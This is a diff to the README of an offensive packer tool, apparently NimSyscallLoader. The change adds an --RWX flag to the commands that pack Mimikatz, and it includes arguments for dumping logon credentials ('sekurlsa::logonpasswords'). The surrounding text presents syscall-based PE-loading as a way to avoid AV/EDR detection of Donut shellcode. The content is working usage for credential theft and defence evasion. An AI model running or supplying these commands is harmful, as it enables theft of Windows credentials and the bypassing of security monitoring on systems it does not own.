@@ -218,7 +218,7 @@ Packedmimikatz.exe coffee exit
 You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:
 
 ```batch
-NimSyscallLoader --file mimikatz.exe --peload --arguments "privilege::debug sekurlsa::logonpasswords exit"
+NimSyscallLoader --file mimikatz.exe --peload --RWX --arguments "privilege::debug sekurlsa::logonpasswords exit"
 ``` 
 
 Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loading I modified my [Nim-RunPE](https://github.com/S3cur3Th1sSh1t/Nim-RunPe) to use Syscalls for PE-Loading and integrated it here:
@@ -226,7 +226,8 @@ Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loadin
 To pack Mimikatz for example and load it via syscall PE-Loader use the following:
 
 ```batch
-NimSyscallLoader --file=mimikatz.exe --peload
+NimSyscallLoader --file=mimikatz.exe --peload --RWX
+(RWX is important here, as many binaries have problems being executed with only READ_EXECUTE permissions, which is default)
 ```
 
 To pack Shellcode for local injection:
